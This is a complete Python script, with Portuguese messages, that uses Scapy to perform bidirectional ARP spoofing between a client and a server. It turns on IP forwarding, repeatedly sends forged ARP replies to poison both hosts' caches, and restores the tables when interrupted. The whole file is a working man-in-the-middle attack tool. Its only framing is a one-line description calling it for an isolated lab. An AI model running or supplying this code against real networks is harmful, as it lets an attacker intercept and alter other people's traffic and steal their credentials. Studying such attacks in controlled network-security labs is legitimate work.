import argparse
import os
import sys
import time

try:
    from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp
except ImportError:
    print("ERRO: Scapy nao instalado. Execute: pip install scapy")
    sys.exit(1)


def require_linux():
    if sys.platform != "linux":
        print("ERRO: este script foi desenvolvido para Linux.")
        sys.exit(1)


def enable_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w", encoding="ascii") as forwarding:
        forwarding.write("1")


def restore_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w", encoding="ascii") as forwarding:
        forwarding.write("0")


def resolve_mac(ip):
    mac = getmacbyip(ip)
    if mac is None:
        raise RuntimeError(f"Nao foi possivel obter o MAC de {ip}")
    return mac


def spoof(target_ip, target_mac, pretend_ip, attacker_mac, interface):
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=pretend_ip,
        hwsrc=attacker_mac,
    )
    sendp(packet, iface=interface, verbose=False)


def restore(target_ip, target_mac, real_ip, real_mac, interface):
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_ip,
        hwsrc=real_mac,
    )
    sendp(packet, iface=interface, count=5, inter=0.1, verbose=False)


def main():
    parser = argparse.ArgumentParser(
        description="ARP spoofing bidirecional para laboratorio isolado."
    )
    parser.add_argument("interface", help="Interface de rede, por exemplo: eth0")
    parser.add_argument("target_ip", help="IP da VM cliente")
    parser.add_argument("server_ip", help="IP da VM servidor")
    args = parser.parse_args()

    require_linux()
    if os.geteuid() != 0:
        print("ERRO: execute como root.")
        sys.exit(1)

    try:
        target_mac = resolve_mac(args.target_ip)
        server_mac = resolve_mac(args.server_ip)
        attacker_mac = get_if_hwaddr(args.interface)
    except (OSError, RuntimeError) as error:
        print(f"ERRO: {error}")
        sys.exit(1)

    enable_ip_forwarding()
    print(
        f"ARP spoofing iniciado: {args.target_ip} <-> {args.server_ip} "
        f"atraves de {attacker_mac}"
    )
    print("Pressione Ctrl+C para restaurar as tabelas ARP.")

    try:
        while True:
            spoof(
                args.target_ip,
                target_mac,
                args.server_ip,
                attacker_mac,
                args.interface,
            )
            spoof(
                args.server_ip,
                server_mac,
                args.target_ip,
                attacker_mac,
                args.interface,
            )
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nRestaurando tabelas ARP...")
    except (OSError, RuntimeError) as error:
        print(f"\nERRO durante o ataque: {error}")
        print("Iniciando restauracao...")
    finally:
        restore(
            args.target_ip,
            target_mac,
            args.server_ip,
            server_mac,
            args.interface,
        )
        restore(
            args.server_ip,
            server_mac,
            args.target_ip,
            target_mac,
            args.interface,
        )
        restore_ip_forwarding()
        print("ARP restaurado e encaminhamento desativado.")


if __name__ == "__main__":
    main()
